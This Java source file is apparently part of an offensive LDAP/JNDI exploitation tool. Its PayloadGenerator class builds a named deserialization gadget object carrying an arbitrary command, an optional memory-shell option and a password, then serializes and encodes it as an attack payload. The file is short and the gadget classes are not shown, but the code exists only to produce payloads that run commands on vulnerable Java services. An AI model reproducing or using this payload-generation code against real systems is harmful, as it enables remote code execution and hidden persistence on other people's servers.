package com.idiot9.ldap.utils;

import com.idiot9.ldap.gadgets.GadgetFactory;
import com.idiot9.ldap.gadgets.utils.Reflections;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class PayloadGenerator {
    public static String generatePayload(String gadget,String cmd, String encode, String mem, String password) throws Exception {
        String result = null;
        Class<? extends GadgetFactory> gadgetClass = GadgetFactory.Utils.getGadgetClass(gadget);
        Object gadgetObject = GadgetFactory.Utils.getGadgetObject(gadgetClass, cmd, mem, password);
        byte[] ser = Reflections.ser(gadgetObject);

        encode = encode.toLowerCase();
        result = EncodeFactory.encode(ser, encode);

        return result;
    }
}
